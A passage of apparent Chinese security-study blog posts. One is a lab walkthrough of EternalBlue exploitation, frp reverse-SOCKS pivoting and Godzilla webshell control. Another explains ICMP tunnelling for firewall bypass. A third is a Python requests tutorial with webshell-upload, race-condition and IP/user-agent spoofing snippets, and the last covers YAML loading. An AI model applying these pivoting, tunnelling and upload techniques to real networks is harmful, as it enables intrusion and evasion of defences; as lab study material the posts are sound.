<h4 id="攻击实施第一次穿透"><a href="#攻击实施第一次穿透" class="headerlink" title="攻击实施第一次穿透"></a>攻击实施第一次穿透</h4><p>kali使用msf进行永恒之蓝攻击，上传frpc服务到window7，kali开启frps服务,win7上传frpc服务</p>
<p>1.永恒之蓝攻破windows7,上传frpc服务。编写frpc.ini文件</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213180613.jpg"></p>
<p>先执行服务端：编写frps.ini文件，并启动</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213180945.jpg"></p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213181222.jpg"></p>
<p>windows7执行客户端，发现执行成功，服务端同时端口监听成功</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213181537.jpg"></p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213181548.jpg"></p>
<p>对第一次代理设置全局代理</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213181944.jpg"></p>
<p>尝试远程连接第win7主机</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213182244.jpg"></p>
<p><strong>现对win7添加vm3网卡，新添主机almaliunx主机(网卡为vm3)与win7相连进行</strong></p>
<ul>
<li>win7：VM3下IP：192.168.126.128</li>
<li>almaliunx：VM3下IP：192.168.126.129</li>
</ul>
<h4 id="攻击实施第二次穿透"><a href="#攻击实施第二次穿透" class="headerlink" title="攻击实施第二次穿透"></a>攻击实施第二次穿透</h4><p>访问socks代理下win7网站（实际上方便学习frp技术，已内置了一句话木马）</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213184742.jpg"></p>
<p>使用哥斯拉进行木马控制:</p>
<p>tips:使用命令为：proxychain4 java -jar godzilla.jar</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213190057.jpg"></p>
<p>上传frpc服务，编写frpc.ini</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213190457.jpg"></p>
<ul>
<li><p>注意，这里的server_addr的IP为客户端可以ping到的服务端主机即Windows7。要上传到temp目录下。</p>
<p>上传成功后，先开启服务端frps服务（再window7上开启，先配置好frps.ini文件），再开启frpc客户端。</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213191611.jpg"></p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213192015.jpg"></p>
<p>设置proxychain4配置文件：</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213193412.jpg"></p>
</li>
</ul>
<p>此时回到kali主机进行nmap扫描almaliunx主机，发现成功</p>
<p><img src="/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231213193507.jpg"></p>
<p>至此已经完成。</p>
<h4 id="流程详解"><a href="#流程详解" class="headerlink" title="流程详解"></a>流程详解</h4><p>此次攻击主要穿透两层，使得kali可以绕过两台主机访问almaliunx主机，这里使用启动了两次frp服务（反向socks代理，一次为kali做服务端，windows7做客户端，windows7连接kali，使得kali通过代理可以访问于windows7相通的win7主机，进而攻击win7活动webshell,使win7做frp客户端，windows7做frp服务端，进而windows7可以访问与win7相同的almaliunx主机，最后使得流量返回kali。</p>
<ul>
<li>这里 Windows7既做服务端，又做客户端，进而桥接起kali与win7的连接</li>
<li>proxychain4的全局代理最后要多次socks5代理</li>
<li>godzilla.jar软件对get传参的支持性不佳，建议改为post（至少攻击时get连接失败，害得我反复修改ini文件 (– __–)</li>
<li>frp新版在一些情况下不支持ini文件，建议改为toml文件。</li>
</ul>
<h5 id="存在疑问："><a href="#存在疑问：" class="headerlink" title="存在疑问："></a>存在疑问：</h5><p>不知道为什么proxychain4下nmap rdesktop都可以执行，但是ping多次尝试也得不到回复？</p>
<p>后来一想：代理是socks5,指定为tcp流了，ping是icmp协议。尬住了&lt;&#x3D;+__+&#x3D;&gt;。</p>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>渗透测试，路由</tag>
      </tags>
  </entry>
  <entry>
    <title>ping-ptunnel与icmp隧道绕过</title>
    <url>/2023/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<hr>
<p>填坑，之前frp和socks隧道代理后，proxychain4 ping无法返回包，此次学习了pingtunnel与icmp隧道绕过</p>
<hr>
<h4 id="网络拓扑图如下"><a href="#网络拓扑图如下" class="headerlink" title="网络拓扑图如下"></a>网络拓扑图如下</h4><img src="/2023/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/12/14/pingtunnel%E4%B8%8Eicmp%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87/11-17022646760041.jpg" class>

<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="icmp协议"><a href="#icmp协议" class="headerlink" title="icmp协议"></a>icmp协议</h5><p>ICMP（Internet Control Message Protocol）Internet控制<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87/3164352?fromModule=lemma_inlink">报文</a>协议。它是<a href="https://baike.baidu.com/item/TCP/IP/214077?fromModule=lemma_inlink">TCP&#x2F;IP</a>协议簇的一个子协议，用于在IP<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E5%99%A8/108294?fromModule=lemma_inlink">路由器</a>之间传递控制消息。控制消息是指网络通不通、<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151?fromModule=lemma_inlink">主机</a>是否可达、<a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1/363497?fromModule=lemma_inlink">路由</a>是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 （百度百科）</p>
<h4 id="icmp隧道"><a href="#icmp隧道" class="headerlink" title="icmp隧道"></a>icmp隧道</h4><p>在实际的后渗透阶段：因为防火墙（大多不止一个）存在，未必开启了可以使用的端口（有时是因为要到的shell权限过低等无权操作防火墙）进行利用。那么可以利用icmp隧道建立联系。因为icmp协议工作在网络层，依附于IP工作，（像上一篇文章的坑：ping无数据包返回）。</p>
<p>因此，我们可以包tcp&#x2F;unp数据包封装到icmp协议中（还在学习中，解释如下）：</p>
<blockquote>
<p><strong>请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。</strong> </p>
<p><strong>Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。 对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。</strong> 																																解释内容参考：先知社区《内网渗透之icmp隐藏隧道》</p>
</blockquote>
<h4 id="ptunnel工具"><a href="#ptunnel工具" class="headerlink" title="ptunnel工具"></a>ptunnel工具</h4><p>ptunnel是一款建立ICMP隧道传输数据的工具。</p>
<p>命令释义：</p>
<ul>
<li><p>参数-p：指定代理服务器，即此示例中的代理服务器B（192.168.1.2）</p>
</li>
<li><p>参数-lp：指定本地监听端口</p>
</li>
<li><p>参数-da：指定欲访问的目标服务器</p>
</li>
<li><p>参数-dp：指定欲访问的目标端口</p>
<p>待更新。。。。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>渗透测试，icmp协议</tag>
      </tags>
  </entry>
  <entry>
    <title>python之request库</title>
    <url>/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/</url>
    <content><![CDATA[<hr>
<hr>
<p>在复现一些web的CVE时，多会用到python脚本进行辅助攻击和利用，其中利用追到的无非就是requets库了。</p>
<hr>
<h3 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li><p>使用pip install requests即可下载该库，使用import即可导入该库</p>
<p><img src="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/%7B5AC7B09C-6A33-47ca-A7CA-7ED7FD3C437D%7D.png" alt="安装requets库"></p>
</li>
<li><p>在github上下载源码进行编译安装，执行以下命令：</p>
</li>
</ul>
<blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://github.com/kennethreitz/requests.git</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="单一命令使用"><a href="#单一命令使用" class="headerlink" title="单一命令使用"></a>单一命令使用</h4><p>现在使用易优CMS进行演示</p>
<p>requests.get函数可以用来发送来发送http请求，并返回得到的数据包（默认保存在text文件中）。</p>
<p><img src="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/%7B564A2C10-43D8-41dd-A44E-2963AE3415E9%7D.png" alt="相关安装"></p>
<p>当然上述命令用于发送get请求，参数可以直接拼接到url中，但如果post请求，则因该使用<code>request.post</code> 函数</p>
<p>在网站的后台登录出有post传参用户名和密码：</p>
<p><img src="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/%7B4C0D96C9-5CB1-4e89-A360-8983FA36E0E4%7D.png" alt="后台登录"></p>
<p>一般大多情况下post传参使用application&#x2F;x-www-form-urlencoded格式，在requests中使用字典的格式被requests模块并传参。</p>
<p><img src="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/%7B013A0C66-5F41-4ed2-8574-0F03FEC04B27%7D.png" alt="post传参登录"></p>
<p>当然reuquests还有PUT、DELETE等传参方式。</p>
<h3 id="返回参数的利用"><a href="#返回参数的利用" class="headerlink" title="返回参数的利用"></a>返回参数的利用</h3><p>调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等。</p>
<table>
<thead>
<tr>
<th>返回类型</th>
<th>解释（具体含义）</th>
</tr>
</thead>
<tbody><tr>
<td>r.status_code</td>
<td>获得http中返回的状态码，可用于编写一些网页状态的脚本（如文件上传-条件竞争）</td>
</tr>
<tr>
<td>r.url</td>
<td>请求的最终地址（应是多见于30x的跳转</td>
</tr>
<tr>
<td>r.encoding</td>
<td>对于request返回的text文件的编码格式</td>
</tr>
<tr>
<td>r.reason</td>
<td>状态码的描述，例如404的Not Found 同r.status_code</td>
</tr>
<tr>
<td>r.content</td>
<td>返回的相应内容，且为byte类型</td>
</tr>
<tr>
<td>r.text</td>
<td>对于request返回的text文件</td>
</tr>
<tr>
<td>r.json</td>
<td>内置得JSON解码器</td>
</tr>
<tr>
<td>r.cookie</td>
<td>返回得cookie值</td>
</tr>
</tbody></table>
<h3 id="ip伪造head头部伪造"><a href="#ip伪造head头部伪造" class="headerlink" title="ip伪造head头部伪造"></a>ip伪造head头部伪造</h3><p>当然一个网站有时会对请求会检测请求的浏览器类型，ip地址等，这是会涉及到head头部伪造</p>
<h4 id="使用IP代理池伪装IP"><a href="#使用IP代理池伪装IP" class="headerlink" title="使用IP代理池伪装IP"></a>使用IP代理池伪装IP</h4><p>利于python中定义自己想要设置得ip地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies = &#123;    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://xxx.xx.xx.xxx:xxx&#x27;</span>,    </span><br><span class="line">				.... </span><br><span class="line">			   <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://xx.xxx.xxx.xxx:xxxx&#x27;</span>,</span><br><span class="line">		  &#125;</span><br><span class="line">response = requests.get(url,proxies=proxies)</span><br></pre></td></tr></table></figure>
<p>对于代理ip的获取，可以使用python爬取免费的且可爬取的代理ip例如在github上一个开源的代理IP地址**<a href="https://github.com/Python3WebSpider/ProxyPool">ProxyPool</a>** ，通过如下代码获取代理IP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxy_pool_url = <span class="string">&#x27;http://localhost:5555/random&#x27;</span> <span class="comment">#项目获取代理代理IP的本地网址</span></span><br><span class="line"><span class="comment"># 获取代理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxy</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(proxy_pool_url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>: </span><br><span class="line">            <span class="keyword">return</span> response.text <span class="comment"># 返回的内容为代理IP</span></span><br><span class="line">    <span class="keyword">except</span> ConnectionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">real_proxy = <span class="string">&#x27;http://&#x27;</span> + get_proxy()</span><br></pre></td></tr></table></figure>

<h5 id="浏览器伪装"><a href="#浏览器伪装" class="headerlink" title="浏览器伪装"></a>浏览器伪装</h5><p>大多User-Agent值可以通过开发者工具（F12）获取到比如常见的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests   </span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">&#x27;</span>&#125;  <span class="comment">#模拟Chrome浏览器  </span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>,headers=headers) </span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/24/python%E4%B9%8Brequest%E5%BA%93/%7BC9F2A256-A796-4f96-A6B2-F368BBE048BE%7D.png" alt="user-Agent模拟"></p>
<blockquote>
<p>对于一些网站对于访问速率(频次)的限制，可以使用一个time库中的sleep进行延迟发送，当然更加逼真的话可以使用random库中的random()函数来生成随机数进行变频访问</p>
</blockquote>
<h3 id="会话保持"><a href="#会话保持" class="headerlink" title="会话保持"></a>会话保持</h3><p>大多数网站是通过session对象跨请求保持某些参数，即保持登陆状态，官方的说就是你使用requests尝试登录并且验证成功，服务端会返回一些Cookie，这些Cookie可以使你的下次请求不需要验证，而Session对象能保持这些Cookie，而不用你每次提交请求时构建一个新的Cookie。</p>
<p>例如使用<code>rs = requests.Session()</code> 来打开会话，在获取返回结果时用<code>restult = session.post/get()</code>。利用在登录一个post传参的网站时，可以使用如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">rs = requests.session() <span class="comment">#建立会话</span></span><br><span class="line">data =&#123;</span><br><span class="line">   <span class="string">&#x27;usename&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, </span><br><span class="line">   <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;xxxxx&#x27;</span>   </span><br><span class="line">&#125;</span><br><span class="line">url =<span class="string">&quot;https://passport.xx.com/user/login&quot;</span> <span class="comment"># 登录url地址</span></span><br><span class="line">restult = session.post(url,data=data) <span class="comment">#不再使用request而是session</span></span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&quot;https://xx.com/ck/shopping/id/235667&quot;</span><span class="comment"># 再次请求 登录后的网站获取数据</span></span><br><span class="line">result_data =  session.get(url2)</span><br><span class="line"><span class="built_in">print</span>(result_data.json()[<span class="string">&#x27;data&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h3 id="文件上传和下载"><a href="#文件上传和下载" class="headerlink" title="文件上传和下载"></a>文件上传和下载</h3><p>对于一些CVE脚本会进行一些文件上传的操作(如上传一句木马)，但这是并不是htnl代码般浏览器访问选择文件然后上传。以post方式（表单）上传多是先将二进制文件读取到内存中，再将内存中的文件发送到服务器保存。</p>
<h4 id="单文件上传"><a href="#单文件上传" class="headerlink" title="单文件上传"></a>单文件上传</h4><p>例如下列代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="comment"># 打开一个文件,其中‘w’为创建或覆盖文件，‘a’用于追写文件内容，‘xb’为以二进制方式打开，x为读写模式，‘r’为只读该文件 </span></span><br><span class="line">fo.write( <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>) <span class="comment"># 关闭打开的文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">files &#123;<span class="string">&#x27;file1&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="string">&#x27;image/png&#x27;</span>&#125; <span class="comment">#上传文件以二进制方式上传.&#x27;image/png&#x27;为上传类型，可以不指定</span></span><br><span class="line">response requests.post(<span class="string">&#x27;http://www.hackxxx.com/upload.php&#x27;</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h4 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h4><p>多文件上传同于单文件上传，只需修改一下file参数即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">files &#123;(<span class="string">&#x27;file1&#x27;</span>,(<span class="string">&#x27;shell1.php&#x27;</span><span class="built_in">open</span>(<span class="string">&#x27;shell1.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>),<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">       (<span class="string">&#x27;file2&#x27;</span>,(<span class="string">&#x27;shell2.php&#x27;</span><span class="built_in">open</span>(<span class="string">&#x27;shell2.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>),<span class="string">&#x27;image/jpeg&#x27;</span>))</span><br><span class="line">       (<span class="string">&#x27;file3&#x27;</span>,(<span class="string">&#x27;shell3.php&#x27;</span><span class="built_in">open</span>(<span class="string">&#x27;shell3.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>),<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">      &#125;  <span class="comment">#这里同样可以指定或不指定文件名称和文件类型，不指定文件名称应该是以打开文件名称作为文件名</span></span><br></pre></td></tr></table></figure>

<p>其实还有以流的方式上传和监听时上传(requests-toolbet),但还未学习。</p>
<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>对于较小文件可以直接利用写的操作完成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">&quot;http://www.hackxxx.com//shell.jpg&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;c:\shell.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以二进制方式打开</span></span><br><span class="line">    f.write(req.content)</span><br></pre></td></tr></table></figure>

<p>当 Python 写入文件时，会将数据暂存在内存中，直至缓存存满后才真正写入文件。如果需要写入的数据很大，可能会导致内存不足。因此对于大文件的下载，可以采取分块读写的方法，每次只读写一小块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">&quot;http://www.hackxxx.com//shell.jpg&quot;</span>, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;c:\shell.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> req.iter_content(chunk_size=<span class="number">1024</span>):  <span class="comment"># 每次加载1024字节</span></span><br><span class="line">        f.write(chunk)</span><br></pre></td></tr></table></figure>

<ul>
<li>这里with会自动判断是否关闭文件，所以不用在写<code>f.close()</code> 函数了。但浏览一些网上文章显示后讲到会遇到文件关闭后在一直占用进程，可能与部署的应用和版本有关吧？</li>
</ul>
<h3 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h3><p>大多脚本都时在cmd&#x2F;bash下进行命令行传参，这样方便管理和使用。在传参是多会用到<code>if __name__ == &quot;__main__&quot;:</code>函数</p>
<p>python属于脚本语言，同于php语言，对代码是逐句解释运行，一直从首行运行到尾行，这样会出现一些函数需要在特定条件下执行而无法被提前或滞后执行。而<code>if __name__ == &quot;__main__&quot;:</code>可以作为程序入口进行选择性执行一些函数。但它与C语言中的mian()不同的是可以多个文件中出现。</p>
<p>对于cmd中的参数，会使用到sys库中的argv，但要注意到是argv本身为一个数组，接受的一个了参数（argv[0]）是文件本身的名称，因此cmd下执行时第一个参数接受代码应为：<code>sys.argv[1]</code></p>
<p>例如以前的在upload-lab中条件竞争模块使用的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## shell.py</span></span><br><span class="line"><span class="comment">## @Author : recyvan</span></span><br><span class="line"><span class="comment">## @Time : 2023-12-22</span></span><br><span class="line"><span class="comment">## #Description : upload-lab pass-17.</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        req=requests.get(url)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZYY6_w.x_AGwnOGnXqmNAIWoT4Mi4Q68HU&#x27;</span>&#125;</span><br><span class="line">        reqcode=req.status_code</span><br><span class="line">        <span class="keyword">if</span> reqcode == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;uopload success！&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(reqcode)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=sys.argv[<span class="number">1</span>] </span><br><span class="line">    re(url)</span><br></pre></td></tr></table></figure>

<p>例如执行python shell.py -u <a href="http://127.0.0.1/xxx/shell.php">http://127.0.0.1/xxx/shell.php</a> 执行后 url等于“ <a href="http://127.0.0.1/xxx/shell.php%E2%80%9D%E3%80%82">http://127.0.0.1/xxx/shell.php”。</a></p>
<hr>
<p>关于其他脚本的学习（类，函数定义，列表，库等）学习后单独更新。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全，python</tag>
      </tags>
  </entry>
  <entry>
    <title>python加载yml实现特定功能</title>
    <url>/2024/03/31/python%E5%8A%A0%E8%BD%BDyml%E5%AE%9E%E7%8E%B0%E7%89%B9%E5%AE%9A%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<p>在一些python脚本常常会用到yml(yaml)文件去加载相关配置，那么我们也可以用yml文件储存可变的参数信息进而可拓展的动态加载可执行内容。这样可以大大增加可拓展型和维护性。</p>
<hr>
<h3 id="yaml文件"><a href="#yaml文件" class="headerlink" title="yaml文件"></a>yaml文件</h3><p>yaml是一种标记语言，其语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><ul>
<li>大小写敏感</li>
<li>使用缩进表示层级关系</li>
<li>缩进不允许使用tab，只允许空格</li>
<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>
<li>‘#’表示注释</li>
<li>以 <strong>-</strong> 开头的行表示构成一个数组，取消 <strong>-</strong> 表示构成一个字典</li>
</ul>
<p>yaml的对象对象键值对使用冒号结构表示 <strong>key: value</strong>，冒号后面要加一个空格。也可以使用 **key:{key1: value1, key2: value2, …}**。但更为常用的是使用缩进表示层级关系。</p>
<p>例如一下例子：<strong>要严格注意缩进</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @name: exmple.yaml</span></span><br><span class="line"><span class="comment"># @Author: recyvan</span></span><br><span class="line"><span class="comment"># @Date: 2024-4-1</span></span><br><span class="line"><span class="comment"># @information: exmple</span></span><br><span class="line"><span class="attr">libray:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">num1:</span> <span class="string">fire</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">num2:</span> <span class="string">requests</span></span><br><span class="line"><span class="attr">url:</span></span><br><span class="line">  <span class="attr">headers:</span> <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;</span></span><br><span class="line"><span class="attr">meth:</span></span><br><span class="line">  <span class="attr">menthod:</span> <span class="string">GET</span></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key1:</span> <span class="string">a=index.html</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key2:</span> <span class="string">b=index.py</span></span><br><span class="line"><span class="attr">cmd:</span></span><br><span class="line"> <span class="attr">com:</span> <span class="string">dir</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>



<p>通过上述yaml文件可以了解到该文件的创建作者，时间，对象信息，参数，子参数等内容。</p>
<h3 id="python库-yaml"><a href="#python库-yaml" class="headerlink" title="python库-yaml"></a>python库-yaml</h3><p>那么创建好了简单的yaml文件，如何用python动态加载呢？这里使用到了python的一个库–yaml库来解析文件。安装方式： pip install PyYaml。</p>
<h4 id="读取yaml文件数据"><a href="#读取yaml文件数据" class="headerlink" title="读取yaml文件数据"></a>读取yaml文件数据</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">file_yml = <span class="string">&quot;./exmple.yaml&quot;</span></span><br><span class="line">fp=<span class="built_in">open</span>(file_yml,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rf=fp.read()</span><br><span class="line">fp.close()</span><br><span class="line"> <span class="comment">#tream=rf表示要加载的YAML文件的流（stream）,Loader=yaml.FullLoader指定了YAML文件的加载器（loader）</span></span><br><span class="line">ymlone = yaml.load(stream=rf,Loader=yaml.FullLoader)</span><br><span class="line"><span class="built_in">print</span>(ymlone)</span><br></pre></td></tr></table></figure>

<p>内容将以字典的方式返回：</p>
<p><img src="/2024/03/31/python%E5%8A%A0%E8%BD%BDyml%E5%AE%9E%E7%8E%B0%E7%89%B9%E5%AE%9A%E5%8A%9F%E8%83%BD/%7BD601CCC8-62D0-4eb2-8E18-0FB1130A945F%7D.png" alt="样例一"></p>
<h4 id="读取yml指定参数"><a href="#读取yml指定参数" class="headerlink" title="读取yml指定参数"></a>读取yml指定参数</h4><p>在这个示例中，我们首先使用<code>yaml.load()</code>函数加载YAML文件，并将其解析为Python对象。然后，我们使用<code>data.get(&#39;param_name&#39;)</code>来获取特定参数的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">file_yml = <span class="string">&quot;./exmple.yaml&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_yml,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    data = yaml.load(fp, Loader=yaml.FullLoader)</span><br><span class="line"><span class="comment"># 获取特定参数的值</span></span><br><span class="line">param_value = data.get(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line"><span class="comment"># 打印参数值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;参数值:&quot;</span>, param_value)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
